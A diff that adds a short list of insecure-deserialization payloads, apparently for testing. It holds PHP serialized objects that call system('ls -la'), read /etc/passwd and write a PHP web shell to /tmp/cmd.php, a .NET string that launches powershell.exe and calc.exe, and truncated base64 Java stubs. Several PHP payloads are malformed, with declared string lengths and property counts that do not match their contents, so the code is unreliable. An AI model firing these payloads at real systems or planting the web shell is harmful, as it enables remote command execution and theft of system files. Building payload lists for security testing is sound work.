@@ -1,0 +1,20 @@
+O:8:"Exploit":1:{s:4:"test";s:24:"insecure deserialization";}
+O:9:"Exploit2":2:{s:4:"code";s:35:"echo 'This is a test of exploit';";}
+O:10:"Exploit3":3:{s:4:"exec";s:25:"system('ls -la');";}
+
+# Java-based payloads (hypothetical, for example purposes)
+rO0ABXNyABFqYXZhLnV0aWwuU2V0PppD9zKsbIACAAB4cHcEAAAAAHh
+rO0ABXNyABdqYXZhLmxhbmcuUnVudGltZdp8GJNj9WQCAAB4cHcIAHh
+
+# .NET-based payloads
+<Serializable><ViewStateUserKey>state:|userkey|cmd|powershell.exe|/c calc.exe</ViewStateUserKey></Serializable>
+
+# Generic payloads that attempt to leak system information
+O:4:"Date":1:{s:8:"timezone";s:9:"/etc/passwd";}
+
+# More complex payloads that involve file operations or system commands
+O:9:"FileWrite":1:{s:4:"path";s:12:"/tmp/cmd.php";s:4:"data";s:27:"<?php system($_GET['cmd']); ?>"}
+O:9:"FileRead":1:{s:4:"path";s:10:"/etc/passwd";}
+
+# Payloads designed to trigger errors or unusual behavior to detect handling of unexpected data
+a:2:{i:0;s:6:"system";i:1;s:3:"ls";}
